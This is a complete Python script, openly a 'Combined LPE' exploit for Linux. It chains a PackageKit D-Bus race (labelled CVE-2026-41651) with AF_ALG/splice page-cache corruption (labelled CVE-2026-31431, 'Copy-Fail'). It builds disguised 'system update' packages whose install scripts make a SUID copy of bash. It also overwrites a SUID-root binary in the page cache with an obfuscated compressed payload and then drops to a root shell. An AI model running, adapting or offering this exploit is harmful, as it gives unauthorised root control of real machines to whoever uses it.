#!/usr/bin/env python3

import ctypes
import ctypes.util
import os
import shutil
import subprocess
import sys
import time
import zlib

try:
    import socket
except ImportError:
    socket = None

def _pick_workdir():
    for d in [os.path.expanduser("~"), "/var/tmp", "/dev/shm", "/tmp"]:
        try:
            if os.path.isdir(d) and os.access(d, os.W_OK):
                test = os.path.join(d, f".lpe_test_{os.getpid()}")
                with open(test, "w") as f:
                    f.write("x")
                os.remove(test)
                return d
        except (OSError, IOError):
            continue
    return "/tmp"

WORKDIR = _pick_workdir()
TARGET_SUID = os.path.join(WORKDIR, ".suid_bash")
DUMMY_PKG = os.path.join(WORKDIR, "dummy_pkg")
PAYLOAD_PKG = os.path.join(WORKDIR, "payload_pkg")

RACE_ATTEMPTS = 8

SUID_CANDIDATES = [
    "/usr/bin/su",
    "/bin/su",
    "/usr/bin/passwd",
    "/usr/bin/chsh",
    "/usr/bin/newgrp",
    "/usr/bin/pkexec",
    "/usr/bin/sudo",
    "/usr/bin/chfn",
    "/usr/bin/mount",
    "/usr/bin/umount",
    "/usr/bin/fusermount3",
    "/usr/bin/fusermount",
    "/usr/bin/gpasswd",
    "/usr/bin/at",
    "/usr/bin/crontab",
    "/lib/polkit-1/polkit-agent-helper-1",
    "/usr/lib/polkit-1/polkit-agent-helper-1",
    "/usr/sbin/polkit-agent-helper-1",
    "/usr/lib64/nagios/plugins/check_ide_smart",
    "/usr/lib64/nagios/plugins/check_icmp",
    "/usr/lib64/nagios/plugins/check_fping",
    "/usr/lib64/nagios/plugins/check_dhcp",
]

AUTHENCESN_ALGORITHMS = [
    "authencesn(hmac(sha256),cbc(aes))",
    "authencesn(hmac(sha512),cbc(aes))",
    "authencesn(hmac(sha384),cbc(aes))",
    "authencesn(hmac(sha256),ctr(aes))",
    "authencesn(hmac(sha1),cbc(aes))",
    "authencesn(hmac(sha256),cbc(camellia))",
]


def run_quiet(cmd, **kwargs):
    return subprocess.run(cmd, stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL, **kwargs)


def check_root_status():
    r = subprocess.run(["id"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    out = r.stdout.strip()
    print(f"[*] {out}")
    return "uid=0" in out or "euid=0" in out


def escalate_suid(path):
    print(f"[+] SUID binary ready: {path}")
    r = subprocess.run([path, "-p", "-c", "id"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    out = r.stdout.strip()
    print(f"[*] Verify: {out}")
    if "euid=0" in out or "uid=0" in out:
        print("[+++] ROOT! Dropping to shell...")
        os.execl(path, path, "-p")
    else:
        print("[-] SUID binary not giving euid=0 (nosuid mount?)")
        raise RuntimeError("SUID escalation failed")


def find_suid_binary():
    for path in SUID_CANDIDATES:
        if os.path.exists(path):
            try:
                st = os.stat(path)
                if (st.st_mode & 0o4000) and st.st_uid == 0:
                    if os.access(path, os.R_OK) and os.access(path, os.X_OK):
                        return path
            except (PermissionError, OSError):
                continue

    for search_dir in ["/usr/bin", "/bin", "/usr/sbin", "/sbin", "/usr/local/bin"]:
        try:
            for name in os.listdir(search_dir):
                full = os.path.join(search_dir, name)
                try:
                    st = os.stat(full)
                    if (st.st_mode & 0o4000) and st.st_uid == 0 and os.access(full, os.R_OK) and os.access(full, os.X_OK):
                        return full
                except (PermissionError, OSError):
                    continue
        except (PermissionError, OSError):
            continue

    return None

_libc = None
_splice_func = None

def _get_libc():
    global _libc
    if _libc is None:
        lib_name = ctypes.util.find_library('c')
        if lib_name:
            _libc = ctypes.CDLL(lib_name, use_errno=True)
        else:
            _libc = ctypes.CDLL("libc.so.6", use_errno=True)
    return _libc


def _get_splice():
    global _splice_func
    if _splice_func is not None:
        return _splice_func

    if hasattr(os, 'splice'):
        _splice_func = os.splice
        return _splice_func

    libc = _get_libc()
    if not hasattr(libc, 'splice'):
        return None

    libc.splice.argtypes = [
        ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
        ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
        ctypes.c_size_t, ctypes.c_uint,
    ]
    libc.splice.restype = ctypes.c_ssize_t

    def splice_wrapper(fd_in, fd_out, count, offset_src=None, offset_dst=None):
        off_in = None
        off_out = None
        if offset_src is not None:
            off_in = ctypes.c_int64(offset_src)
            off_in = ctypes.byref(off_in)
        if offset_dst is not None:
            off_out = ctypes.c_int64(offset_dst)
            off_out = ctypes.byref(off_out)

        ret = libc.splice(fd_in, off_in, fd_out, off_out, count, 0)
        if ret < 0:
            errno = ctypes.get_errno()
            raise OSError(errno, os.strerror(errno))
        return ret

    _splice_func = splice_wrapper
    return _splice_func

def detect_pkg_system():
    if shutil.which("dpkg-deb") or shutil.which("dpkg"):
        return "deb"
    if shutil.which("rpm") or shutil.which("rpmbuild"):
        return "rpm"
    if os.path.exists("/usr/bin/ar") or shutil.which("ar"):
        return "deb_manual"
    return None


def build_deb_dpkg(path, name, is_payload=False):
    tmp_dir = os.path.join(WORKDIR, f"build_{name}_{os.getpid()}")
    debian_dir = os.path.join(tmp_dir, "DEBIAN")
    os.makedirs(debian_dir, exist_ok=True)
    os.chmod(debian_dir, 0o755)

    with open(os.path.join(debian_dir, "control"), "w") as f:
        f.write(f"Package: {name}\nVersion: 1.0\nArchitecture: all\n"
                f"Maintainer: x <x@x>\nDescription: system update\n")

    if is_payload:
        postinst = os.path.join(debian_dir, "postinst")
        with open(postinst, "w") as f:
            f.write(f"#!/bin/sh\ncp /bin/bash {TARGET_SUID}\nchmod 4755 {TARGET_SUID}\n")
        os.chmod(postinst, 0o755)

    r = subprocess.run(["dpkg-deb", "-b", tmp_dir, path],
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(["rm", "-rf", tmp_dir])
    return r.returncode == 0


def build_deb_manual(path, name, is_payload=False):
    work = os.path.join(WORKDIR, f"build_{name}_{os.getpid()}")
    os.makedirs(work, exist_ok=True)

    debian_binary = os.path.join(work, "debian-binary")
    with open(debian_binary, "w") as f:
        f.write("2.0\n")

    ctrl_dir = os.path.join(work, "control_dir")
    os.makedirs(ctrl_dir, exist_ok=True)
    with open(os.path.join(ctrl_dir, "control"), "w") as f:
        f.write(f"Package: {name}\nVersion: 1.0\nArchitecture: all\n"
                f"Maintainer: x <x@x>\nDescription: system update\n")

    if is_payload:
        postinst = os.path.join(ctrl_dir, "postinst")
        with open(postinst, "w") as f:
            f.write(f"#!/bin/sh\ncp /bin/bash {TARGET_SUID}\nchmod 4755 {TARGET_SUID}\n")
        os.chmod(postinst, 0o755)

    control_tar = os.path.join(work, "control.tar.gz")
    subprocess.run(["tar", "czf", control_tar, "-C", ctrl_dir, "."],
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    data_tar = os.path.join(work, "data.tar.gz")
    subprocess.run(["tar", "czf", data_tar, "--files-from", "/dev/null"],
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if os.path.exists(path):
        os.remove(path)
    r = subprocess.run(
        ["ar", "r", path, debian_binary, control_tar, data_tar],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=work
    )
    subprocess.run(["rm", "-rf", work])
    return r.returncode == 0


def build_rpm(path, name, is_payload=False):
    spec_content = f"""Name: {name}
Version: 1.0
Release: 1
Summary: system update
License: MIT
BuildArch: noarch

%description
system update

"""
    if is_payload:
        spec_content += f"""%post
cp /bin/bash {TARGET_SUID}
chmod 4755 {TARGET_SUID}

"""
    spec_content += "%files\n"

    work = os.path.join(WORKDIR, f"rpmbuild_{name}_{os.getpid()}")
    for d in ["SPECS", "SOURCES", "BUILD", "RPMS", "SRPMS"]:
        os.makedirs(os.path.join(work, d), exist_ok=True)

    spec_path = os.path.join(work, "SPECS", f"{name}.spec")
    with open(spec_path, "w") as f:
        f.write(spec_content)

    r = subprocess.run(
        ["rpmbuild", "-bb", "--define", f"_topdir {work}", spec_path],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    if r.returncode == 0:
        import glob
        rpms = glob.glob(f"{work}/RPMS/**/*.rpm", recursive=True)
        if rpms:
            shutil.copy2(rpms[0], path)
            subprocess.run(["rm", "-rf", work])
            return True

    subprocess.run(["rm", "-rf", work])
    return False


def build_package(path, name, is_payload=False):
    pkg_sys = detect_pkg_system()

    if pkg_sys == "deb":
        return build_deb_dpkg(path, name, is_payload)
    elif pkg_sys == "deb_manual":
        return build_deb_manual(path, name, is_payload)
    elif pkg_sys == "rpm":
        ext = ".rpm" if not path.endswith(".rpm") else ""
        return build_rpm(path + ext, name, is_payload)
    else:
        return build_deb_manual(path, name, is_payload)


def packagekit_available():
    for tool in ["gdbus", "busctl", "dbus-send"]:
        if shutil.which(tool):
            if tool == "gdbus":
                r = subprocess.run(
                    ["gdbus", "call", "--system",
                     "--dest", "org.freedesktop.PackageKit",
                     "--object-path", "/org/freedesktop/PackageKit",
                     "--method", "org.freedesktop.PackageKit.CreateTransaction"],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=10
                )
                if r.returncode == 0 and "/" in r.stdout:
                    return "gdbus", r.stdout.strip()
            elif tool == "busctl":
                r = subprocess.run(
                    ["busctl", "call", "org.freedesktop.PackageKit",
                     "/org/freedesktop/PackageKit",
                     "org.freedesktop.PackageKit", "CreateTransaction"],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=10
                )
                if r.returncode == 0 and "/" in r.stdout:
                    return "busctl", r.stdout.strip()
    return None, None


def try_packagekit_pygi():
    try:
        from gi.repository import Gio, GLib
    except ImportError:
        return False

    pkg_sys = detect_pkg_system()
    if not pkg_sys:
        print("[-] No package build tool found")
        return False

    dummy = DUMMY_PKG + (".deb" if pkg_sys != "rpm" else ".rpm")
    payload = PAYLOAD_PKG + (".deb" if pkg_sys != "rpm" else ".rpm")

    if not build_package(dummy, "pk-dummy", False):
        print("[-] Failed to build dummy package")
        return False
    if not build_package(payload, "pk-payload", True):
        print("[-] Failed to build payload package")
        return False
    print(f"[+] Packages built ({pkg_sys})")

    try:
        connection = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)
        res = connection.call_sync(
            "org.freedesktop.PackageKit",
            "/org/freedesktop/PackageKit",
            "org.freedesktop.PackageKit",
            "CreateTransaction",
            None,
            GLib.VariantType.new("(o)"),
            Gio.DBusCallFlags.NONE, -1, None
        )
        tid = res.unpack()[0]
        print(f"[+] Transaction: {tid}")

        connection.call(
            "org.freedesktop.PackageKit", tid,
            "org.freedesktop.PackageKit.Transaction", "InstallFiles",
            GLib.Variant("(tas)", (4, [dummy])),
            None, Gio.DBusCallFlags.NONE, -1, None, None
        )
        connection.call(
            "org.freedesktop.PackageKit", tid,
            "org.freedesktop.PackageKit.Transaction", "InstallFiles",
            GLib.Variant("(tas)", (0, [payload])),
            None, Gio.DBusCallFlags.NONE, -1, None, None
        )
        connection.flush_sync(None)
        return True

    except Exception as e:
        print(f"[-] PyGI D-Bus error: {e}")
        return False


def try_packagekit_gdbus():
    if not shutil.which("gdbus"):
        return False

    pkg_sys = detect_pkg_system()
    if not pkg_sys:
        print("[-] No package build tool found")
        return False

    ext = ".deb" if pkg_sys != "rpm" else ".rpm"
    dummy = DUMMY_PKG + ext
    payload = PAYLOAD_PKG + ext

    if not build_package(dummy, "pk-dummy", False):
        print("[-] Failed to build dummy package")
        return False
    if not build_package(payload, "pk-payload", True):
        print("[-] Failed to build payload package")
        return False
    print(f"[+] Packages built ({pkg_sys}) via manual method")

    try:
        r = subprocess.run(
            ["gdbus", "call", "--system",
             "--dest", "org.freedesktop.PackageKit",
             "--object-path", "/org/freedesktop/PackageKit",
             "--method", "org.freedesktop.PackageKit.CreateTransaction"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=10
        )
        if r.returncode != 0:
            print(f"[-] CreateTransaction failed: {r.stderr.strip()}")
            return False

        tid = r.stdout.strip().strip("()'\" ,")
        if "/" not in tid:
            print(f"[-] Invalid transaction path: {tid}")
            return False
        print(f"[+] Transaction: {tid}")

        p1 = subprocess.Popen(
            ["gdbus", "call", "--system",
             "--dest", "org.freedesktop.PackageKit",
             "--object-path", tid,
             "--method", "org.freedesktop.PackageKit.Transaction.InstallFiles",
             "uint64 4", f"['{dummy}']"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        p2 = subprocess.Popen(
            ["gdbus", "call", "--system",
             "--dest", "org.freedesktop.PackageKit",
             "--object-path", tid,
             "--method", "org.freedesktop.PackageKit.Transaction.InstallFiles",
             "uint64 0", f"['{payload}']"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        p1.wait(timeout=15)
        p2.wait(timeout=15)
        return True

    except Exception as e:
        print(f"[-] gdbus error: {e}")
        return False


def try_packagekit_busctl():
    if not shutil.which("busctl"):
        return False

    pkg_sys = detect_pkg_system()
    if not pkg_sys:
        return False

    ext = ".deb" if pkg_sys != "rpm" else ".rpm"
    dummy = DUMMY_PKG + ext
    payload = PAYLOAD_PKG + ext

    if not build_package(dummy, "pk-dummy", False):
        return False
    if not build_package(payload, "pk-payload", True):
        return False
    print(f"[+] Packages built ({pkg_sys}) via busctl path")

    try:
        r = subprocess.run(
            ["busctl", "call", "org.freedesktop.PackageKit",
             "/org/freedesktop/PackageKit",
             "org.freedesktop.PackageKit", "CreateTransaction"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=10
        )
        if r.returncode != 0:
            return False

        tid = r.stdout.strip().split('"')[1] if '"' in r.stdout else None
        if not tid:
            return False
        print(f"[+] Transaction: {tid}")

        p1 = subprocess.Popen(
            ["busctl", "call", "org.freedesktop.PackageKit", tid,
             "org.freedesktop.PackageKit.Transaction", "InstallFiles",
             "tas", "4", "1", dummy],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        p2 = subprocess.Popen(
            ["busctl", "call", "org.freedesktop.PackageKit", tid,
             "org.freedesktop.PackageKit.Transaction", "InstallFiles",
             "tas", "0", "1", payload],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        p1.wait(timeout=15)
        p2.wait(timeout=15)
        return True

    except Exception as e:
        print(f"[-] busctl error: {e}")
        return False


def _fire_race_once():
    """Single race attempt. Returns True if the D-Bus call succeeded (fired)."""
    methods = [
        ("PyGObject", try_packagekit_pygi),
        ("gdbus", try_packagekit_gdbus),
        ("busctl", try_packagekit_busctl),
    ]
    for name, fn in methods:
        try:
            if fn():
                return True
        except Exception as e:
            print(f"[-] {name} exception: {e}")
    return False


def try_packagekit():
    print("\n[=== METHOD 1: CVE-2026-41651 — PackageKit LPE ===]")
    print(f"[*] Work directory: {WORKDIR}")

    dbus_socket = "/var/run/dbus/system_bus_socket"
    if not os.path.exists(dbus_socket) and not os.path.exists("/run/dbus/system_bus_socket"):
        print("[-] System D-Bus socket not found, skipping PackageKit")
        return False

    for attempt in range(1, RACE_ATTEMPTS + 1):
        print(f"\n[*] Race attempt {attempt}/{RACE_ATTEMPTS}...")

        if not _fire_race_once():
            if attempt == 1:
                print("[-] All PackageKit D-Bus methods failed, no point retrying")
                return False
            continue

        print("[*] Waiting for SUID binary...", end="", flush=True)
        wait_secs = 10 if attempt > 1 else 20
        for _ in range(wait_secs):
            if os.path.exists(TARGET_SUID):
                try:
                    st = os.stat(TARGET_SUID)
                    if st.st_mode & 0o4000:
                        print(f"\n[+++] SUID created: {TARGET_SUID}")
                        _cleanup_packages()
                        return True
                except OSError:
                    pass
            print(".", end="", flush=True)
            time.sleep(0.5)

        print(f" not yet (attempt {attempt})")
        _cleanup_packages()
        time.sleep(0.2)

    print(f"\n[-] SUID binary not created after {RACE_ATTEMPTS} attempts")
    _cleanup_packages()
    return False


def _cleanup_packages():
    for pattern in [DUMMY_PKG, PAYLOAD_PKG]:
        for ext in [".deb", ".rpm", ""]:
            p = pattern + ext
            if os.path.exists(p):
                try:
                    os.remove(p)
                except OSError:
                    pass

AF_ALG = 38
SOL_ALG = 279


def try_load_algif():
    modprobe = shutil.which("modprobe")
    if not modprobe:
        for p in ["/sbin/modprobe", "/usr/sbin/modprobe"]:
            if os.path.isfile(p) and os.access(p, os.X_OK):
                modprobe = p
                break

    if modprobe:
        for mod in ["algif_aead", "authencesn", "hmac", "cbc", "aes"]:
            try:
                run_quiet([modprobe, mod], timeout=5)
            except (FileNotFoundError, PermissionError, OSError):
                pass

    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.close()
        return True
    except (OSError, PermissionError):
        return False


def find_working_algorithm():
    for algo in AUTHENCESN_ALGORITHMS:
        try:
            s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            s.bind(("aead", algo))
            s.close()
            return algo
        except (OSError, PermissionError):
            continue
    return None


def try_copyfail():
    print("\n[=== METHOD 2: CVE-2026-31431 — Copy-Fail Page Cache ===]")

    if socket is None:
        print("[-] socket module not available")
        return False

    print("[*] Checking AF_ALG availability...")
    if not try_load_algif():
        print("[-] AF_ALG socket not available (kernel module not loaded or AF_ALG disabled)")
        print("    Errno 97 = kernel compiled without AF_ALG support")
        print("    Try: /sbin/modprobe algif_aead (needs root or permissive policy)")
        return False
    print("[+] AF_ALG socket available")

    print("[*] Finding working authencesn algorithm...")
    algo = find_working_algorithm()
    if not algo:
        print("[-] No authencesn algorithm available")
        print("    Tried:", ", ".join(AUTHENCESN_ALGORITHMS[:3]), "...")
        return False
    print(f"[+] Using: {algo}")

    splice = _get_splice()
    if splice is None:
        print("[-] splice() not available (need Python 3.10+ or libc with splice)")
        return False
    use_ctypes = not hasattr(os, 'splice')
    if use_ctypes:
        print("[+] Using ctypes splice fallback (Python < 3.10)")
    else:
        print("[+] Using native os.splice")

    target_bin = find_suid_binary()
    if not target_bin:
        print("[-] No readable SUID-root binary found")
        print("    Searched:", ", ".join(SUID_CANDIDATES[:5]), "...")
        return False
    print(f"[+] Target SUID binary: {target_bin}")

    if not os.access(target_bin, os.R_OK) or not os.access(target_bin, os.X_OK):
        print(f"[-] {target_bin} is not readable+executable by current user")
        return False

    print(f"[*] Corrupting page cache of {target_bin} via {algo}...")

    try:
        def _d(x):
            return bytes.fromhex(x)

        def _copy_chunk(fd, offset, content):
            a = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            a.bind(("aead", algo))
            h = SOL_ALG
            a.setsockopt(h, 1, _d('0800010000000010' + '0' * 64))
            a.setsockopt(h, 5, None, 4)
            u, _ = a.accept()
            o = offset + 4
            i = _d('00')
            u.sendmsg(
                [b"A" * 4 + content],
                [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
                32768
            )
            r, w = os.pipe()

            if use_ctypes:
                off_src = ctypes.c_int64(0)
                _get_libc().splice(fd, ctypes.byref(off_src), w, None, o, 0)
            else:
                splice(fd, w, o, offset_src=0)

            if use_ctypes:
                _get_libc().splice(r, None, u.fileno(), None, o, 0)
            else:
                splice(r, u.fileno(), o)

            try:
                u.recv(8 + offset)
            except Exception:
                pass

            os.close(r)
            os.close(w)
            u.close()
            a.close()

        fd = os.open(target_bin, os.O_RDONLY)

        payload = zlib.decompress(_d(
            "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d"
            "16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff5936"
            "11fcacfa499979fac5190c0c0c0032c310d3"
        ))

        total_chunks = len(payload) // 4
        print(f"[*] Writing {total_chunks} chunks (4 bytes each)...")

        i = 0
        while i < len(payload):
            _copy_chunk(fd, i, payload[i:i + 4])
            i += 4

        os.close(fd)
        print("[+] Page cache corruption complete!")
        print(f"[*] Executing corrupted SUID binary: {target_bin}")

        suid_cmds = (
            f"cp /bin/bash {TARGET_SUID}\n"
            f"chmod 4755 {TARGET_SUID}\n"
            f"exit\n"
        )
        try:
            proc = subprocess.Popen(
                [target_bin],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            stdout, _ = proc.communicate(suid_cmds.encode(), timeout=15)
            output = stdout.decode(errors='replace').strip()
            if output:
                for line in output.splitlines():
                    print(f"  {line}")
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
        except Exception as e:
            print(f"[-] Popen error: {e}")

        if os.path.exists(TARGET_SUID):
            try:
                st = os.stat(TARGET_SUID)
                if st.st_mode & 0o4000:
                    print(f"[+++] SUID bash created: {TARGET_SUID}")
                    return True
            except OSError:
                pass

        print("[!] Auto SUID creation failed, falling back to interactive shell")
        os.execl(target_bin, target_bin)
        return True

    except FileNotFoundError as e:
        print(f"[-] File not found: {e}")
        print("    The target binary may have been removed or path is wrong")
        return False
    except PermissionError as e:
        print(f"[-] Permission denied: {e}")
        print("    AF_ALG may be blocked by seccomp/AppArmor/SELinux")
        return False
    except OSError as e:
        if e.errno == 2:  # ENOENT
            print(f"[-] ENOENT during exploit — algorithm or binary missing")
            print(f"    Algo: {algo}")
            print(f"    Binary: {target_bin}")
            print("    Try: cat /proc/crypto | grep authencesn")
        elif e.errno == 22:  # EINVAL
            print(f"[-] EINVAL — kernel rejected socket operation")
            print("    Possible causes: seccomp filter, kernel too old, bad params")
        elif e.errno == 93:  # EPROTONOSUPPORT
            print(f"[-] Protocol not supported — AF_ALG disabled in this kernel")
        else:
            print(f"[-] OS error ({e.errno}): {e}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {type(e).__name__}: {e}")
        return False

def main():
    print("=" * 60)
    print("  Combined LPE — CVE-2026-41651 + CVE-2026-31431")
    print("  PackageKit Race + Copy-Fail Page Cache")
    print("=" * 60)
    print(f"[*] uid={os.getuid()} euid={os.geteuid()} pid={os.getpid()}")
    print(f"[*] Python {sys.version.split()[0]} on {os.uname().sysname} {os.uname().release}")
    print(f"[*] Workdir: {WORKDIR} | SUID target: {TARGET_SUID}")

    if os.geteuid() == 0:
        print("[+] Already root!")
        os.execl("/bin/bash", "bash")
        return

    if try_packagekit():
        try:
            escalate_suid(TARGET_SUID)
            return
        except RuntimeError as e:
            print(f"[!] Method 1 escalation failed: {e}")
            print("[*] Falling through to Method 2 (copyfail)...")

    if try_copyfail():
        if os.path.exists(TARGET_SUID):
            try:
                escalate_suid(TARGET_SUID)
                return
            except RuntimeError:
                print("[!] SUID escalation failed after copyfail")
        else:
            if check_root_status():
                print("[+++] ROOT via copy-fail!")
            return

    print("\n" + "=" * 60)
    print("[!] Both methods failed. Diagnostics:")
    print("=" * 60)
    print("\n  Method 1 (PackageKit) requires:")
    print("    - System D-Bus accessible")
    print("    - PackageKit <= 1.3.4 installed & activatable")
    print("    - One of: python3-gi, gdbus, busctl")
    print("    - One of: dpkg-deb, ar+tar, rpmbuild")

    print("\n  Method 2 (Copy-Fail) requires:")
    print("    - Linux kernel 4.14 — 6.18.21 / 6.19.11 (pre-patch)")
    print("    - algif_aead module loaded (AF_ALG socket family 38)")
    print("    - authencesn algorithm available")
    print("    - A world-readable SUID-root binary")
    print("    - Python 3.6+ with libc splice() or Python 3.10+")
    print("    - No seccomp/AppArmor blocking AF_ALG")

    print("\n  Quick checks:")
    print("    cat /proc/crypto | grep authencesn")
    print("    find / -perm -4000 -user root -readable 2>/dev/null")
    print("    pkcon --version")
    print("    gdbus call --system --dest org.freedesktop.PackageKit \\")
    print("      --object-path /org/freedesktop/PackageKit \\")
    print("      --method org.freedesktop.PackageKit.CreateTransaction")

    sys.exit(1)


if __name__ == "__main__":
    main()
